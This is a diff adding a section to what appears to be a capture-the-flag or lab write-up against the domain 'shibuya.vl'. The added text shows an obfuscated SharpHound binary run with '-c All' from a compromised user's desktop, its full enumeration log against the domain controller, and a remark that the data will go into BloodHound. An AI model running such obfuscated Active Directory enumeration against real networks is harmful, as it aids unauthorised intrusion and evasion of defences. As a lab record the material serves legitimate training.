@@ -335,6 +335,32 @@ SharpHound.exe._obf.exe                                                         
 This uploaded it to the target
 
 ```python
+PS C:\Users\simon.watson\Desktop> C:\programdata\SharpHound.exe._obf.exe -c All
+2026-03-21T11:45:04.9212245-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-03-21T11:45:04.9368346-07:00|INFORMATION|Initializing SharpHound at 11:45 AM on 3/21/2026
+2026-03-21T11:45:05.1087094-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for shibuya.vl : AWSJPDC0522.shibuya.vl
+2026-03-21T11:45:29.2024608-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-03-21T11:45:29.4525518-07:00|INFORMATION|Beginning LDAP search for shibuya.vl
+2026-03-21T11:45:29.7649708-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2026-03-21T11:45:29.7649708-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2026-03-21T11:45:59.7806376-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 44 MB RAM
+2026-03-21T11:46:29.7832388-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
+2026-03-21T11:46:40.9394061-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2026-03-21T11:46:40.9862875-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2026-03-21T11:46:41.0800291-07:00|INFORMATION|Status: 600 objects finished (+600 8.450705)/s -- Using 52 MB RAM
+2026-03-21T11:46:41.0800291-07:00|INFORMATION|Enumeration finished in 00:01:11.6390331
+2026-03-21T11:46:41.1894060-07:00|INFORMATION|Saving cache with stats: 559 ID to type mappings.
+ 559 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2026-03-21T11:46:41.2050349-07:00|INFORMATION|SharpHound Enumeration Completed at 11:46 AM on 3/21/2026! Happy Graphing!
+PS C:\Users\simon.watson\Desktop>
+```
+I have now got some data i can upload to bloodhound
+
+```python
 
 ```
 
